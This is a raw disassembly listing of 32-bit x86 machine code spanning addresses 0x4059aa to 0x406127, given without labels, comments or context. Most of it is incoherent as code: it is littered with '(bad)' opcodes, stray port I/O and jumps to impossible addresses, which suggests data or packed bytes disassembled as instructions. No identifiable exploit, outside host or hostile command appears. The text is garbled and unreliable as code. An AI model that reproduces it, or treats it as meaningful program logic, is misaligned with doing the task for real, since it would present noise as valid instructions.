  4059aa:	add    BYTE PTR [eax],al
  4059ac:	(bad)  
  4059ad:	inc    DWORD PTR [eax]
  4059af:	cmp    DWORD PTR [edx-0x210052c1],0x51
  4059b6:	mov    ebp,0x830091b0
  4059bb:	dec    DWORD PTR [ecx-0x35000001]
  4059c1:	(bad)  
  4059c2:	in     eax,dx
  4059c3:	add    BYTE PTR [ebx+0x7e],bh
  4059c6:	scas   al,BYTE PTR es:[edi]
  4059c7:	pop    edi
  4059c8:	(bad)
  4059cb:	inc    DWORD PTR [eax]
  4059cd:	(bad)  
  4059ce:	dec    esp
  4059d0:	dec    edi
  4059d1:	(bad)  
  4059d2:	cmp    eax,0x2e5ce4ff
  4059d7:	dec    ecx
  4059d8:	daa    
  4059d9:	inc    DWORD PTR [eax]
  4059db:	add    DWORD PTR [ebx+0x1affff89],0xffffffac
  4059e2:	stc    
  4059e3:	or     edi,0x3e
  4059e6:	push   ebp
  4059e7:	out    dx,al
  4059e8:	or     al,0x89
  4059ea:	add    DWORD PTR [eax],0xffffff83
  4059ed:	(bad)  
  4059ee:	inc    DWORD PTR [ebx-0x96986]
  4059f4:	ror    DWORD PTR [ecx-0x42],cl
  4059f7:	mov    ch,0x6c
  4059f9:	(bad)  
  4059fa:	(bad)  
  4059fb:	(bad)  
  4059fc:	(bad)  
  4059fd:	dec    DWORD PTR [ecx-0x75393f7d]
  405a03:	(bad)  
  405a04:	jnp    0x40599f
  405a06:	dec    ebp
  405a07:	ds aad 0x89
  405a0a:	add    DWORD PTR [ebx-0x33ff01],0x6
  405a11:	add    eax,0x0
  405a14:	cld    
  405a15:	outs   dx,DWORD PTR ds:[esi]
  405a16:	shl    dh,1
  405a18:	mov    es,WORD PTR [eax]
  405a1a:	inc    DWORD PTR [ebx+0xcc8900]
  405a20:	popa   
  405a21:	enter  0xe7,0x65
  405a25:	fs pop ds
  405a27:	jb     0x405a43
  405a29:	(bad)  
  405a2a:	inc    DWORD PTR [ebx-0x100]
  405a30:	mov    bh,0xa3
  405a32:	rol    DWORD PTR [eax],cl
  405a34:	sar    DWORD PTR [ecx],1
  405a36:	or     DWORD PTR [ecx-0xffc5],esi
  405a3c:	int3   
  405a3d:	add    bh,bh
  405a3f:	dec    DWORD PTR [edi-0x7efffdb9]
  405a45:	sub    al,0xd
  405a47:	pop    eax
  405a48:	das    
  405a49:	add    bh,bh
  405a4b:	inc    DWORD PTR [eax]
  405a4d:	int3   
  405a4e:	inc    DWORD PTR [eax]
  405a50:	out    0x80,al
  405a52:	lods   eax,DWORD PTR ds:[esi]
  405a53:	mov    DWORD PTR [eax],eax
  405a55:	jmp    0x405a61
  405a57:	inc    esp
  405a58:	stc    
  405a59:	(bad)  
  405a5a:	inc    DWORD PTR [eax]
  405a5c:	inc    DWORD PTR [ebx+0x474a8983]
  405a62:	inc    ebx
  405a63:	dec    ecx
  405a65:	mov    esp,0x830a0a35
  405a6a:	(bad)  
  405a6b:	inc    DWORD PTR [eax]
  405a6d:	(bad)  
  405a6e:	(bad)  
  405a6f:	inc    DWORD PTR [esi-0x4d]
  405a72:	fwait
  405a73:	add    dh,dl
  405a75:	or     DWORD PTR [esi+0xccc60d],edi
  405a7b:	cmp    edi,0xffffffcc
  405a7e:	inc    DWORD PTR [ebx-0x7cdf15d1]
  405a84:	pushf  
  405a85:	stos   BYTE PTR es:[edi],al
  405a86:	xchg   ebp,eax
  405a87:	out    0x13,eax
  405a89:	add    bh,bh
  405a8b:	add    bh,bh
  405a8d:	inc    DWORD PTR [ebx-0x4eea4200]
  405a93:	dec    DWORD PTR [esi]
  405a95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a97:	lods   eax,DWORD PTR ds:[esi]
  405a98:	mov    edi,?
  405a9a:	(bad)  
  405a9b:	(bad)  
  405a9c:	inc    DWORD PTR [eax]
  405a9e:	cmp    edi,0x41
  405aa1:	hlt    
  405aa2:	sar    edi,0x87
  405aa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aa6:	mov    dh,0xc5
  405aa8:	sub    eax,0xff000083
  405aad:	inc    DWORD PTR [eax]
  405aaf:	int3   
  405ab0:	xchg   ebp,eax
  405ab1:	jo     0x405ae6
  405ab3:	int3   
  405ab4:	and    ebp,DWORD PTR [edx]
  405ab6:	fisttp QWORD PTR [eax]
  405ab8:	scas   eax,DWORD PTR es:[edi]
  405ab9:	add    DWORD PTR [ebx+0x830000],0xffffffff
  405ac0:	pop    ebx
  405ac1:	push   esp
  405ac2:	in     al,dx
  405ac3:	inc    ebp
  405ac5:	xchg   DWORD PTR [eax+0xff1333],esi
  405acb:	(bad)  
  405acc:	inc    DWORD PTR [eax]
  405ace:	cmp    edi,0x7c
  405ad1:	(bad)  
  405ad2:	das    
  405ad3:	call   edx
  405ad5:	mov    ecx,0xff75c52c
  405ada:	inc    DWORD PTR [eax]
  405adc:	add    bh,bh
  405ade:	add    DWORD PTR [ebx-0x2eaec1],0xffffffae
  405ae5:	fld    TBYTE PTR [eax+edx*1]
  405ae8:	inc    ebp
  405ae9:	add    bh,bh
  405aeb:	int3   
  405aec:	add    bh,bh
  405aee:	inc    DWORD PTR [eax]
  405af0:	mov    DWORD PTR gs:[ecx-0x7d],edi
  405af4:	clc    
  405af5:	jns    0x405a9e
  405af7:	mov    ebx,DWORD PTR [edi]
  405af9:	add    bh,bh
  405afb:	(bad)  
  405afc:	(bad)  
  405afd:	inc    DWORD PTR [eax]
  405aff:	int3   
  405b00:	or     bl,BYTE PTR [esi]
  405b02:	xor    bh,bh
  405b04:	and    dh,BYTE PTR [bp-0x7e]
  405b08:	hlt    
  405b09:	(bad)  
  405b0a:	(bad)  
  405b0b:	(bad)  
  405b0c:	dec    esp
  405b0e:	add    bh,bh
  405b10:	cmp    ebx,DWORD PTR [esp+edi*2-0x1]
  405b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b15:	push   eax
  405b16:	ds pushf 
  405b18:	retf   
  405b19:	inc    DWORD PTR [eax]
  405b1b:	inc    DWORD PTR [ebx+0x2bffff00]
  405b21:	dec    edi
  405b22:	cwde   
  405b23:	inc    DWORD PTR [edi+0x4c746ac]
  405b29:	add    BYTE PTR [eax],al
  405b2b:	int3   
  405b2c:	inc    DWORD PTR [eax]
  405b2e:	add    bh,bh
  405b30:	mov    ecx,0xdff5504
  405b35:	loope  0x405b9b
  405b37:	std    
  405b38:	les    eax,FWORD PTR [eax]
  405b3a:	add    bh,bh
  405b3c:	(bad)  
  405b3d:	(bad)  
  405b3e:	(bad)  
  405b3f:	dec    DWORD PTR [ecx]
  405b41:	js     0x405b78
  405b43:	call   FWORD PTR [eax-0x59121aaf]
  405b49:	int3   
  405b4a:	add    BYTE PTR [eax],al
  405b4c:	add    BYTE PTR [ebx-0x1bd0ff01],al
  405b52:	jle    0x405b53
  405b54:	sub    al,0xf9
  405b56:	add    al,0x78
  405b58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b59:	int3   
  405b5a:	add    ah,cl
  405b5c:	add    DWORD PTR [ebx+0x6021ffff],0xffffffaf
  405b63:	inc    DWORD PTR [ebx+0x73]
  405b66:	gs pop edi
  405b68:	into   
  405b69:	inc    DWORD PTR [ebx+0xffffff]
  405b6f:	and    eax,0x79
  405b72:	cs push eax
  405b75:	push   ecx
  405b76:	popa   
  405b77:	retf   0x8952
  405b7a:	(bad)  
  405b7b:	inc    DWORD PTR [ebx-0x5dff7700]
  405b81:	lods   al,BYTE PTR ds:[si]
  405b83:	call   FWORD PTR [edi-0x20510d5b]
  405b89:	add    BYTE PTR [eax],al
  405b8b:	(bad)  
  405b8c:	dec    esp
  405b8e:	inc    DWORD PTR [eax]
  405b90:	test   DWORD PTR [eax+0x34],ecx
  405b93:	add    DWORD PTR [ebx-0x6b26bf72],0xffffffff
  405b9a:	add    BYTE PTR [eax],al
  405b9c:	add    BYTE PTR [eax],al
  405b9e:	(bad)  
  405b9f:	dec    ecx
  405ba1:	call   0xf95e:0xfeb3ffcf
  405ba8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ba9:	mov    edi,edi
  405bab:	(bad)  
  405bac:	inc    DWORD PTR [eax]
  405bae:	or     esp,0xffffffae
  405bb1:	in     eax,dx
  405bb2:	mov    ah,0xff
  405bb4:	arpl   WORD PTR [ebp-0x335d0d45],cx
  405bba:	(bad)  
  405bbb:	inc    DWORD PTR [ebx+0x1dffff00]
  405bc1:	pop    ds
  405bc2:	retf   
  405bc3:	dec    DWORD PTR [eax+0x1fe2d21f]
  405bc9:	add    bh,bh
  405bcb:	int3   
  405bcc:	(bad)  
  405bcd:	inc    DWORD PTR [eax]
  405bcf:	add    BYTE PTR [ecx-0x5000d495],cl
  405bd5:	in     al,0xf7
  405bd7:	and    al,0x35
  405bd9:	(bad)  
  405bda:	inc    DWORD PTR [eax]
  405bdc:	(bad)  
  405bdd:	(bad)  
  405bde:	inc    DWORD PTR [eax]
  405be0:	or     BYTE PTR [ebx],dl
  405be2:	mov    al,0xff
  405be4:	mov    edi,0xebf0b66c
  405be9:	add    BYTE PTR [ebx-0x33ffff01],al
  405bef:	cmp    DWORD PTR [esi+0x5100d46d],0xffffffb4
  405bf6:	jecxz  0x405c2a
  405bf8:	add    edi,edi
  405bfa:	inc    DWORD PTR [ebx-0x34000000]
  405c00:	push   ecx
  405c01:	and    eax,0x6c83ccc3
  405c06:	push   edi
  405c07:	dec    edx
  405c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c09:	inc    DWORD PTR [eax]
  405c0b:	(bad)  
  405c0c:	dec    esp
  405c0e:	add    DWORD PTR [eax],0x32
  405c11:	jno    0x405c21
  405c13:	inc    ecx
  405c15:	or     ch,cl
  405c17:	pusha  
  405c18:	xchg   edx,eax
  405c19:	int3   
  405c1a:	inc    DWORD PTR [eax]
  405c1c:	mov    edi,edi
  405c1e:	(bad)  
  405c1f:	jmp    DWORD PTR [ebx]
  405c21:	or     edx,ecx
  405c23:	(bad)  
  405c24:	cli    
  405c25:	stos   DWORD PTR es:[edi],eax
  405c26:	xor    dl,BYTE PTR [ecx-0x4b]
  405c29:	(bad)  
  405c2a:	dec    DWORD PTR [ecx-0x7d00]
  405c30:	jb     0x405cb1
  405c32:	mov    cl,0x83
  405c34:	add    eax,0x29a3dd33
  405c39:	dec    DWORD PTR [ecx-0x7c0001]
  405c3f:	add    bh,al
  405c41:	call   0xf1835bf2
  405c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c47:	pop    edx
  405c48:	xchg   bh,bh
  405c4a:	cmp    edi,0x0
  405c4d:	add    ah,cl
  405c4f:	call   DWORD PTR [eax+eax*1+0x28]
  405c53:	add    DWORD PTR [esi+0x37],0x7b
  405c57:	jno    0x405c49
  405c59:	(bad)  
  405c5a:	inc    DWORD PTR [ebx+0xff]
  405c60:	push   ebp
  405c61:	loopne 0x405c0e
  405c63:	xor    DWORD PTR [ebx+eiz*2-0xd10721],0xffffff89
  405c6b:	add    BYTE PTR [eax],al
  405c6d:	inc    DWORD PTR [ebx-0xd742a00]
  405c73:	jmp    ebp
  405c75:	push   ss
  405c76:	cmp    al,0x2c
  405c78:	cwde   
  405c79:	int3   
  405c7a:	inc    DWORD PTR [eax]
  405c7c:	add    bh,bh
  405c7e:	add    bh,bh
  405c80:	or     dl,bh
  405c82:	and    bh,bh
  405c84:	push   edi
  405c85:	test   BYTE PTR [ebx+0x2c],dl
  405c88:	leave  
  405c89:	add    bh,bh
  405c8b:	add    DWORD PTR [eax],0xffffff89
  405c8e:	dec    esp
  405c90:	sbb    al,0x9e
  405c92:	jge    0x405c94
  405c94:	mov    edi,fs
  405c96:	lods   eax,DWORD PTR ds:[esi]
  405c97:	mov    ds:0xffff896f,al
  405c9c:	add    ah,cl
  405c9e:	(bad)  
  405c9f:	push   DWORD PTR [ebx-0x3e001b7b]
  405ca5:	shr    ebp,1
  405ca7:	inc    edx
  405ca8:	push   ss
  405ca9:	add    bh,bh
  405cab:	add    BYTE PTR [eax],al
  405cad:	add    bh,bh
  405caf:	jmp    esp
  405cb1:	mov    dh,0xac
  405cb3:	int3   
  405cb4:	stc    
  405cb5:	icebp  
  405cb6:	jg     0x405cf2
  405cb8:	mov    ebp,0xffffffff
  405cbd:	add    BYTE PTR [ebx+0x7afbbb83],al
  405cc3:	add    BYTE PTR [ecx-0x54],dh
  405cc6:	(bad)  
  405cc7:	cmp    eax,0xff00cc65
  405ccc:	dec    esp
  405cce:	inc    DWORD PTR [eax]
  405cd0:	call   0xb03f9496
  405cd5:	sbb    al,0x24
  405cd7:	out    dx,eax
  405cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cd9:	add    bh,bh
  405cdb:	add    BYTE PTR [eax],al
  405cdd:	int3   
  405cde:	add    BYTE PTR [eax],al
  405ce0:	cmp    DWORD PTR [eax*2+0x54792ff],eax
  405ce7:	mov    ecx,DWORD PTR [eax-0x34]
  405cea:	inc    DWORD PTR [eax]
  405cec:	inc    DWORD PTR [eax]
  405cee:	dec    DWORD PTR [ecx-0x3218ce]
  405cf4:	inc    edi
  405cf5:	push   ecx
  405cf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cf8:	push   ebx
  405cf9:	dec    DWORD PTR [ecx-0x100]
  405cff:	inc    ebp
  405d01:	sbb    ch,BYTE PTR [edx-0x1]
  405d04:	cmp    ch,BYTE PTR [ecx]
  405d06:	add    DWORD PTR [ebp-0x3300ffc3],ecx
  405d0c:	(bad)  
  405d0d:	(bad)  
  405d0e:	inc    DWORD PTR [eax]
  405d10:	ds stos DWORD PTR es:[edi],eax
  405d12:	rol    BYTE PTR [eax],cl
  405d14:	push   esp
  405d15:	push   0xff7e3783
  405d1a:	dec    esp
  405d1c:	mov    DWORD PTR [eax],eax
  405d1e:	(bad)  
  405d1f:	call   FWORD PTR [edx]
  405d21:	aam    0x42
  405d23:	(bad)  
  405d24:	fimul  WORD PTR [ebx-0x4e]
  405d27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d28:	addr16 (bad) 
  405d2a:	inc    DWORD PTR [ebx+0xff00ff]
  405d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d31:	imul   ebp,ebp,0x0
  405d34:	dec    esi
  405d35:	and    dl,bl
  405d37:	test   DWORD PTR ds:0xff000000,edx
  405d3d:	inc    DWORD PTR [ebx-0x790fce01]
  405d43:	dec    DWORD PTR [edx-0x3efe92ac]
  405d49:	inc    DWORD PTR [eax]
  405d4b:	add    bh,bh
  405d4d:	add    bh,bh
  405d4f:	(bad)  
  405d50:	in     eax,dx
  405d51:	xor    ebx,DWORD PTR [edi+edi*8-0x7f]
  405d55:	adc    DWORD PTR [ebp-0x26],0xff000031
  405d5c:	(bad)  
  405d5d:	dec    esp
  405d5f:	call   DWORD PTR [esi+0x75fff659]
  405d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d66:	mov    BYTE PTR [eax+0x68],cl
  405d69:	add    DWORD PTR [eax],0x0
  405d6c:	cmp    edi,0xffffffff
  405d6f:	add    BYTE PTR [eax-0x26],cl
  405d72:	ret    
  405d73:	jmp    DWORD PTR [esi-0x4c]
  405d76:	jne    0x405d0a
  405d78:	int3   
  405d79:	inc    DWORD PTR [ebx-0x76ffff7d]
  405d7f:	(bad)  
  405d80:	ds jmp 0x7f84:0x9c3fff00
  405d88:	js     0x405d89
  405d8a:	add    BYTE PTR [eax],al
  405d8c:	mov    edi,edi
  405d8e:	add    BYTE PTR [ecx-0xf40da6],cl
  405d94:	jo     0x405d7c
  405d96:	test   eax,0x835e54
  405d9b:	add    BYTE PTR [ebx-0x23330034],al
  405da1:	fiadd  DWORD PTR [edx+0x232e21ff]
  405da7:	pop    ds
  405da8:	add    BYTE PTR [ebx+0x8300],al
  405dae:	dec    esp
  405db0:	xchg   BYTE PTR [esi+eax*2-0x7c1f2a34],cl
  405db7:	push   eax
  405db8:	(bad)  
  405db9:	(bad)  
  405dba:	inc    DWORD PTR [eax]
  405dbc:	inc    DWORD PTR [eax]
  405dbe:	add    DWORD PTR [eax],0x1
  405dc1:	adc    BYTE PTR [edi+edi*8+0x612061c7],bh
  405dc8:	aas    
  405dc9:	(bad)  
  405dca:	(bad)  
  405dcb:	inc    DWORD PTR [eax]
  405dcd:	inc    DWORD PTR [eax]
  405dcf:	int3   
  405dd0:	aad    0x47
  405dd2:	pop    ss
  405dd3:	(bad)  
  405dd4:	jnp    0x405d91
  405dd6:	xor    dh,BYTE PTR [ecx+ebx*2+0xff8300]
  405ddd:	add    bh,bh
  405ddf:	add    BYTE PTR [edx],al
  405de1:	mov    eax,0x860d8974
  405de6:	inc    esi
  405de7:	or     ebp,DWORD PTR [ebp+0xffcc89]
  405ded:	add    BYTE PTR [eax],al
  405def:	call   FWORD PTR [eax]
  405df1:	(bad)
  405df5:	sar    DWORD PTR [esi],cl
  405df7:	inc    ebx
  405df8:	pop    ecx
  405df9:	add    bh,bh
  405dfb:	dec    DWORD PTR [ecx-0x76007c01]
  405e01:	scas   al,BYTE PTR es:[edi]
  405e02:	push   ebx
  405e03:	int3   
  405e04:	dec    eax
  405e05:	xor    al,0xe5
  405e08:	out    0xff,eax
  405e0a:	add    bh,bh
  405e0c:	add    BYTE PTR [eax],al
  405e0e:	add    bh,bh
  405e10:	lods   al,BYTE PTR ds:[esi]
  405e11:	push   eax
  405e12:	pop    esp
  405e13:	push   DWORD PTR [ebp+0x1c4c7b7]
  405e19:	inc    DWORD PTR [eax]
  405e1b:	cmp    edi,0xffffff89
  405e1e:	(bad)  
  405e1f:	(bad)  
  405e20:	mov    ecx,0x18ffae1b
  405e25:	xchg   esi,eax
  405e26:	mov    esi,0xcc00691c
  405e2b:	add    BYTE PTR [eax],al
  405e2d:	mov    DWORD PTR [eax],eax
  405e2f:	call   DWORD PTR [ebp-0x1300c787]
  405e35:	mov    cl,0xa4
  405e37:	ins    BYTE PTR es:[edi],dx
  405e38:	loope  0x405e39
  405e3a:	add    DWORD PTR [eax],0x0
  405e3d:	add    bh,bh
  405e3f:	add    BYTE PTR [ebp-0x68],dl
  405e42:	(bad)  
  405e43:	call   FWORD PTR [esi-0x6db7d387]
  405e49:	add    bh,bh
  405e4b:	inc    DWORD PTR [eax]
  405e4d:	(bad)  
  405e4e:	(bad)  
  405e4f:	(bad)  
  405e50:	jns    0x405e4a
  405e52:	(bad)  
  405e54:	xchg   edi,eax
  405e55:	outs   dx,DWORD PTR ds:[esi]
  405e56:	dec    edx
  405e57:	rol    BYTE PTR [edx-0x1],cl
  405e5a:	(bad)  
  405e5b:	(bad)  
  405e5c:	(bad)  
  405e5d:	(bad)  
  405e5e:	inc    DWORD PTR [eax]
  405e60:	(bad)  
  405e61:	mov    ebp,0xcb6e8962
  405e66:	fs cwde 
  405e68:	(bad)  
  405e69:	inc    DWORD PTR [eax]
  405e6b:	add    bh,bh
  405e6d:	add    BYTE PTR [eax],al
  405e6f:	push   esp
  405e71:	xor    dh,BYTE PTR [esi]
  405e73:	jmp    FWORD PTR [ebp+eiz*8+0x12c729]
  405e7a:	inc    DWORD PTR [eax]
  405e7c:	add    DWORD PTR [ebx-0x375fff7d],0x7a
  405e83:	int3   
  405e84:	aad    0xdb
  405e86:	push   0xffffffb2
  405e88:	sub    edi,edi
  405e8a:	or     DWORD PTR [ecx+0xffffcc],0xffffffa5
  405e91:	rcr    edi,cl
  405e93:	jmp    DWORD PTR [ebp+0x69]
  405e96:	mov    dl,0x3c
  405e98:	push   ecx
  405e99:	(bad)  
  405e9a:	inc    DWORD PTR [eax]
  405e9c:	int3   
  405e9d:	(bad)  
  405e9e:	(bad)  
  405e9f:	(bad)  
  405ea0:	jmp    DWORD PTR [esi+0x7331ffbc]
  405ea6:	data16 and dh,BYTE PTR [eax+0x0]
  405eaa:	cmp    edi,0xffffffff
  405ead:	(bad)  
  405eae:	(bad)  
  405eaf:	(bad)  
  405eb0:	jmp    0x405e95
  405eb2:	es mov ebp,ecx
  405eb5:	hlt    
  405eb6:	push   0xfffffff2
  405eb8:	pop    es
  405eb9:	(bad)  
  405eba:	(bad)  
  405ebb:	(bad)  
  405ebc:	(bad)  
  405ebd:	inc    DWORD PTR [eax]
  405ebf:	push   DWORD PTR [ebp+0x6300cf07]
  405ec5:	ret    
  405ec6:	and    DWORD PTR [ebx-0x7c8f],eax
  405ecc:	inc    DWORD PTR [eax]
  405ece:	inc    DWORD PTR [ebx-0x33acf694]
  405ed4:	cwde   
  405ed5:	jbe    0x405ed2
  405ed7:	xor    DWORD PTR [eax],edi
  405ed9:	add    BYTE PTR [eax],al
  405edb:	cmp    edi,0xffffffcc
  405ede:	add    bh,bh
  405ee0:	mov    al,ds:0x3d89c911
  405ee5:	mov    bh,0x41
  405ee7:	pusha  
  405ee8:	mov    ah,0x83
  405eea:	inc    DWORD PTR [eax]
  405eec:	inc    DWORD PTR [ebx+0xf840000]
  405ef2:	or     ah,0xc4
  405ef5:	mov    WORD PTR [ebx+0x36],ds
  405ef8:	leave  
  405ef9:	(bad)  
  405efa:	(bad)  
  405efb:	inc    DWORD PTR [eax]
  405efd:	inc    DWORD PTR [ebx+0x18fb34ff]
  405f03:	or     DWORD PTR [edx],0x27
  405f06:	push   edx
  405f07:	mov    ebp,0x89ffd3
  405f0c:	add    bh,bh
  405f0e:	(bad)  
  405f0f:	call   FWORD PTR [edx-0x32]
  405f12:	jmp    0x352ea6a0
  405f17:	outs   dx,DWORD PTR ds:[esi]
  405f18:	push   ecx
  405f19:	mov    edi,edi
  405f1b:	mov    DWORD PTR [eax],eax
  405f1d:	add    DWORD PTR [eax],0x0
  405f20:	sub    DWORD PTR [eax],ebx
  405f22:	and    edi,edi
  405f24:	push   ebp
  405f25:	nop
  405f26:	jge    0x405f06
  405f28:	aam    0xcc
  405f2a:	cmp    edi,0xffffffff
  405f2d:	int3   
  405f2e:	add    BYTE PTR [eax],al
  405f30:	cli    
  405f31:	xchg   BYTE PTR [eax+eax*1],ah
  405f34:	or     cl,cl
  405f36:	pop    ss
  405f37:	pushf  
  405f38:	retf   
  405f39:	dec    DWORD PTR [ecx-0x76007d]
  405f3f:	add    dl,dl
  405f41:	popa   
  405f42:	sub    DWORD PTR ds:[ecx],0xffffffa2
  405f46:	jnp    0x405fb0
  405f48:	sub    al,BYTE PTR [eax]
  405f4a:	add    BYTE PTR [eax],al
  405f4c:	add    bh,bh
  405f4e:	(bad)  
  405f4f:	dec    ecx
  405f51:	les    ebx,FWORD PTR [edx]
  405f53:	dec    DWORD PTR [edi]
  405f55:	aas    
  405f56:	out    dx,al
  405f57:	pop    ebx
  405f58:	jmp    0x0:0xff830000
  405f5f:	int3   
  405f60:	cs cld 
  405f62:	fild   DWORD PTR [eax]
  405f64:	dec    eax
  405f65:	push   ds
  405f66:	pop    ecx
  405f67:	jle    0x405f67
  405f69:	(bad)  
  405f6a:	dec    esp
  405f6c:	mov    DWORD PTR [eax],eax
  405f6e:	(bad)  
  405f6f:	jmp    FWORD PTR [ecx]
  405f71:	in     al,dx
  405f72:	aam    0x0
  405f74:	call   0xb74c54b0
  405f79:	add    BYTE PTR [ebx-0x767c0100],al
  405f7f:	jmp    FWORD PTR [edx]
  405f81:	rcr    BYTE PTR [eax],1
  405f83:	add    BYTE PTR [ecx-0x64225c3c],bh
  405f89:	(bad)  
  405f8a:	inc    DWORD PTR [eax]
  405f8c:	(bad)  
  405f8d:	inc    DWORD PTR [ebx-0x71ced801]
  405f93:	int3   
  405f94:	frndint 
  405f96:	lea    esp,[edi]
  405f98:	add    eax,0xffffff00
  405f9d:	add    DWORD PTR [eax],0xffffffff
  405fa0:	ret    0xf98d
  405fa3:	call   DWORD PTR [esi]
  405fa5:	je     0x40600b
  405fa7:	inc    ebp
  405fa8:	cmp    edi,edi
  405faa:	add    bh,bh
  405fac:	dec    esp
  405fae:	dec    esp
  405fb0:	dec    ebp
  405fb1:	outs   dx,DWORD PTR ds:[esi]
  405fb2:	lods   al,BYTE PTR ds:[esi]
  405fb3:	dec    ebp
  405fb5:	sti    
  405fb6:	cmp    BYTE PTR [ebx-0xffffac],0xff
  405fbd:	add    bh,bh
  405fbf:	sub    DWORD PTR [ecx-0x6d005678],0xffffff86
  405fc6:	xchg   DWORD PTR [ecx-0x53],esi
  405fc9:	(bad)  
  405fca:	(bad)  
  405fcb:	(bad)  
  405fcc:	(bad)  
  405fcd:	dec    esp
  405fcf:	add    ah,ch
  405fd1:	push   0xffffffdc
  405fd3:	(bad)  
  405fd4:	fadd   DWORD PTR [edi-0x7cb7745e]
  405fda:	add    BYTE PTR [eax],al
  405fdc:	int3   
  405fdd:	mov    DWORD PTR [eax],eax
  405fdf:	add    BYTE PTR [esi+0x1f003b37],bl
  405fe5:	and    ah,BYTE PTR ds:0xff00ceb8
  405feb:	(bad)  
  405fec:	(bad)  
  405fed:	inc    DWORD PTR [eax]
  405fef:	add    bl,ch
  405ff1:	inc    esi
  405ff2:	mov    dl,0x0
  405ff4:	mov    al,0x9
  405ff6:	out    dx,al
  405ff7:	hlt    
  405ff8:	xchg   ebx,eax
  405ff9:	dec    esp
  405ffb:	add    bh,bh
  405ffd:	inc    DWORD PTR [eax]
  405fff:	call   DWORD PTR [edi-0x5d7c0298]
  406005:	leave  
  406006:	adc    eax,0xcc83c261
  40600b:	dec    esp
  40600d:	int3   
  40600e:	add    BYTE PTR [eax],al
  406010:	push   esp
  406011:	in     al,0x56
  406013:	(bad)  
  406014:	cli    
  406015:	sbb    al,0xca
  406017:	out    0xf4,eax
  406019:	dec    DWORD PTR [ecx+0xff83]
  40601f:	inc    DWORD PTR [eax-0x3f]
  406022:	jmp    0xb437:0x7ed08189
  406029:	inc    DWORD PTR [eax]
  40602b:	inc    DWORD PTR [ebx-0x1eff3301]
  406031:	jns    0x4060ac
  406033:	(bad)  
  406034:	clc    
  406035:	inc    ecx
  406036:	add    esi,ebx
  406038:	aam    0x89
  40603a:	inc    DWORD PTR [eax]
  40603c:	(bad)  
  40603d:	(bad)  
  40603e:	(bad)  
  40603f:	inc    esi
  406041:	or     BYTE PTR [ebx-0x1],al
  406044:	sbb    ebx,eax
  406046:	mov    ch,cl
  406048:	push   eax
  406049:	add    BYTE PTR [eax],al
  40604b:	(bad)  
  40604c:	inc    DWORD PTR [eax]
  40604e:	add    BYTE PTR [eax],al
  406050:	adc    BYTE PTR [ebx+0x3e],0x0
  406054:	daa    
  406055:	loopne 0x406023
  406057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406058:	nop
  406059:	or     DWORD PTR [ecx-0xff0100],0xffffffff
  406060:	cmc    
  406061:	push   esp
  406062:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406063:	or     ebx,0xffffffa7
  406066:	or     eax,0xcc005be4
  40606b:	cmp    edi,0xffffffcc
  40606e:	add    bh,bh
  406070:	xor    DWORD PTR [ecx-0x158bff08],ebx
  406076:	inc    eax
  406077:	aam    0x9f
  406079:	(bad)  
  40607a:	inc    DWORD PTR [eax]
  40607c:	add    BYTE PTR [ebx+0x2affff],al
  406082:	and    bh,bh
  406084:	sbb    al,BYTE PTR [esi-0x27e7a]
  40608a:	add    BYTE PTR [eax],al
  40608c:	(bad)  
  40608d:	(bad)  
  40608e:	(bad)  
  40608f:	dec    DWORD PTR [ebp+0x71ffb88b]
  406095:	mov    ds:0xffeccf23,eax
  40609a:	(bad)  
  40609b:	(bad)  
  40609c:	(bad)  
  40609d:	dec    esp
  40609f:	add    BYTE PTR [edx+0x1effd537],bl
  4060a5:	lods   eax,DWORD PTR ds:[esi]
  4060a6:	or     eax,0xff50fc
  4060ab:	mov    edi,edi
  4060ad:	(bad)  
  4060ae:	(bad)  
  4060af:	push   ecx
  4060b1:	and    ah,dh
  4060b3:	mov    DWORD PTR [esi+0x395f5159],ebp
  4060b9:	inc    DWORD PTR [eax]
  4060bb:	inc    DWORD PTR [eax]
  4060bd:	int3   
  4060be:	inc    DWORD PTR [ebx-0x9b64d2]
  4060c4:	aaa    
  4060c5:	pop    edx
  4060c6:	mov    cl,0x8c
  4060c8:	mov    edx,0xffffcc
  4060cd:	add    bh,bh
  4060cf:	int3   
  4060d0:	stos   BYTE PTR es:[edi],al
  4060d1:	add    BYTE PTR [esi],ch
  4060d3:	jmp    FWORD PTR [ecx]
  4060d5:	or     DWORD PTR [ebp+0x72],edx
  4060d8:	mov    ds:0x83ffff,eax
  4060dd:	add    BYTE PTR [ebx-0x51dc837d],al
  4060e3:	call   FWORD PTR [edi+0x1c61ad20]
  4060e9:	dec    DWORD PTR [ecx-0x7d]
  4060ef:	call   DWORD PTR [esi+0x21]
  4060f2:	mov    eax,0x2f471bff
  4060f7:	out    0xd1,al
  4060f9:	add    bh,bh
  4060fb:	(bad)  
  4060fc:	(bad)  
  4060fd:	inc    DWORD PTR [eax]
  4060ff:	mov    DWORD PTR [ebx],eax
  406101:	(bad)  
  406102:	pop    ebx
  406103:	dec    ecx
  406105:	or     ebp,DWORD PTR [ecx]
  406107:	popa   
  406108:	jns    0x40610a
  40610a:	(bad)  
  40610b:	inc    DWORD PTR [eax]
  40610d:	add    BYTE PTR [eax],al
  40610f:	add    BYTE PTR [edx],ah
  406111:	cmp    cl,bl
  406113:	(bad)  
  406114:	jns    0x40609b
  406116:	sbb    DWORD PTR [esi-0xff0046],ebp
  40611c:	add    DWORD PTR [ebx+0x29a300ff],0xffffffee
  406123:	add    BYTE PTR [edi+0x68],ah
  406126:	pop    ebx
  406127:	int3   
